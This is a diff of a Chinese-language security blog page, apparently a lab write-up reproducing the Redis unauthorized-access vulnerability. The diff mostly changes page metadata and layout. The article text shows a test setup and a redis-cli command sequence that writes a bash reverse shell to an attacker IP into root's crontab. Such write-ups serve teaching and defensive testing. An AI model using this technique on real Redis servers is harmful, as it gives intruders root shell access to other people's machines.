@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="漏洞复现," />
+  <meta name="keywords" content=",,,," />
 
 
 
@@ -81,9 +81,9 @@
 
 <meta name="description" content="redis未授权访问漏洞由于redis的配置不当导致攻击者可以利用该未授权访问漏洞去对服务器进行攻击，redis服务默认端口为6379端口，这篇文章记录了redis未授权访问漏洞的几种利用方法，在利用该漏洞的时候，遇到了一些坑，在这里记录一下 漏洞环境及搭建ubuntu16.04（10.201.10.160）：安装了redis服务的靶机,作为redis-server kali2.0（10.201.">
 <meta name="keywords" content="漏洞复现">
-<meta property="og:type" content="article">
+<meta property="og:type" content="website">
 <meta property="og:title" content="redis未授权访问漏洞">
-<meta property="og:url" content="http://yoursite.com/2018/08/15/redis/index.html">
+<meta property="og:url" content="http://yoursite.com/redis.html">
 <meta property="og:site_name" content="Climber">
 <meta property="og:description" content="redis未授权访问漏洞由于redis的配置不当导致攻击者可以利用该未授权访问漏洞去对服务器进行攻击，redis服务默认端口为6379端口，这篇文章记录了redis未授权访问漏洞的几种利用方法，在利用该漏洞的时候，遇到了一些坑，在这里记录一下 漏洞环境及搭建ubuntu16.04（10.201.10.160）：安装了redis服务的靶机,作为redis-server kali2.0（10.201.">
 <meta property="og:locale" content="zh-Hans">
@@ -131,7 +131,7 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2018/08/15/redis/"/>
+  <link rel="canonical" href="http://yoursite.com/redis.html"/>
 
 
 
@@ -252,108 +252,24 @@
 
   <div id="posts" class="posts-expand">
     
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/08/15/redis/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Climber">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/Ironman.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Climber">
-    </span>
-
     
+    
+    <div class="post-block page">
       <header class="post-header">
 
-        
-        
-          <h1 class="post-title" itemprop="name headline">redis未授权访问漏洞</h1>
-        
+	<h1 class="post-title" itemprop="name headline">redis未授权访问漏洞</h1>
 
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-08-15T17:47:19+08:00">
-                2018-08-15
-              </time>
-            
 
-            
 
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/漏洞复现/" itemprop="url" rel="index">
-                    <span itemprop="name">漏洞复现</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
+</header>
 
       
       
-
       
-        <h1 id="redis未授权访问漏洞"><a href="#redis未授权访问漏洞" class="headerlink" title="redis未授权访问漏洞"></a>redis未授权访问漏洞</h1><p><strong>由于redis的配置不当导致攻击者可以利用该未授权访问漏洞去对服务器进行攻击，redis服务默认端口为6379端口，这篇文章记录了redis未授权访问漏洞的几种利用方法，在利用该漏洞的时候，遇到了一些坑，在这里记录一下</strong></p>
+      <div class="post-body">
+        
+        
+          <h1 id="redis未授权访问漏洞"><a href="#redis未授权访问漏洞" class="headerlink" title="redis未授权访问漏洞"></a>redis未授权访问漏洞</h1><p><strong>由于redis的配置不当导致攻击者可以利用该未授权访问漏洞去对服务器进行攻击，redis服务默认端口为6379端口，这篇文章记录了redis未授权访问漏洞的几种利用方法，在利用该漏洞的时候，遇到了一些坑，在这里记录一下</strong></p>
 <h3 id="漏洞环境及搭建"><a href="#漏洞环境及搭建" class="headerlink" title="漏洞环境及搭建"></a>漏洞环境及搭建</h3><p><strong>ubuntu16.04（10.201.10.160）：安装了redis服务的靶机,作为redis-server</strong></p>
 <p><strong>kali2.0（10.201.10.241）：攻击者机器，同样安装了redis，要使用redis-cli去进行未授权访问的攻击</strong></p>
 <p><strong>该实验中redis的版本为4.0.8，安装redis方法如下</strong></p>
@@ -399,67 +315,15 @@ command: 需要执行的命令
 <p><strong>有日志可以看出任务计划里的命令没有执行成功是因为<code>CRON[45686]: (CRON) info (No MTA installed, discarding output)</code>这个原因，百度了一番后了解到原因是因为cron把屏幕输出都发送到email了，而当前环境并未安装email server，于是系统报错，按照网上的方法安装了对应的邮件服务器后，一直安装失败，这就是另外的一个坑，经过了自己的一番折腾，找到了解决办法</strong></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">set</span> aaa <span class="string">"\n\n\n\nbash -i &gt;&amp; /dev/tcp/10.201.10.241/7777 0&gt;&amp;1\n\n\n\n"</span></div><div class="line">config <span class="built_in">set</span> dir /root</div><div class="line">config <span class="built_in">set</span> dbfilename redis.sh</div><div class="line">save</div><div class="line"><span class="built_in">set</span> bbb <span class="string">"\n\n\n\n* * * * * /bin/bash /root/redis.sh\n\n\n\n"</span></div><div class="line">config <span class="built_in">set</span> dir /var/spool/cron/crontabs</div><div class="line">config <span class="built_in">set</span> dbfilename root</div><div class="line">save</div></pre></td></tr></table></figure>
 
+        
+      </div>
+      
+      
       
     </div>
     
     
     
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-        <div class="post-tags">
-          
-            <a href="/tags/漏洞复现/" rel="tag"># 漏洞复现</a>
-          
-        </div>
-      
-
-      
-      
-      
-
-      
-        <div class="post-nav">
-          <div class="post-nav-next post-nav-item">
-            
-              <a href="/2018/08/08/漏洞组合/" rel="next" title="漏洞挖掘中的脑洞大开---使用漏洞组合拳扩大漏洞危害">
-                <i class="fa fa-chevron-left"></i> 漏洞挖掘中的脑洞大开---使用漏洞组合拳扩大漏洞危害
-              </a>
-            
-          </div>
-
-          <span class="post-nav-divider"></span>
-
-          <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/08/17/2018-08-17/" rel="prev" title="解决ubuntu任务计划写shell失败的问题">
-                解决ubuntu任务计划写shell失败的问题 <i class="fa fa-chevron-right"></i>
-              </a>
-            
-          </div>
-        </div>
-      
-
-      
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-
-    <div class="post-spread">
-      
-    </div>
   </div>
 
 
@@ -521,7 +385,7 @@ command: 需要执行的命令
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">44</span>
+                  <span class="site-state-item-count">43</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
